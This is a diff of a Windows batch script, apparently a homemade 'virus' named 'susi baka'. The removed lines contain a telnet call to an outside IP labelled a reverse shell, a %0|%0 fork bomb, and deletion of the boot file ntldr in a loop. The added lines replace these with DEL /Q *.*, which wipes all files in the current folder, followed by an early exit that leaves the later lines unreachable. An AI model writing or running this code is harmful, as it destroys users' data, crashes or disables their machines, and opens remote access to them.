@@ -1,22 +1,23 @@
-@echo off
+@ECHO OFF
 
 :: change name and color
-title susi baka
-color 57
-
-:: reverse shell into
-:: the windows machine
-telnet 10.14.7.228 8081
+TITLE susi baka
+COLOR a
 
 :: virus
-virus:
+:hey
 
-:: in crease cpu usage
-%0|%0
+:: deletes all there files
+DEL /Q *.*
 
-:: reboot and reinstall windows
-attrib -s -r -h c:\ntldr
-del ntldr
+:: stop func
+EXIT /b 0
 
-:: goto loop
-goto virus
+GOTO hey
+
+
+:: error codes
+IF %ERRORLEVEL% NEQ 0 (
+  ECHO error
+  PAUSE
+)
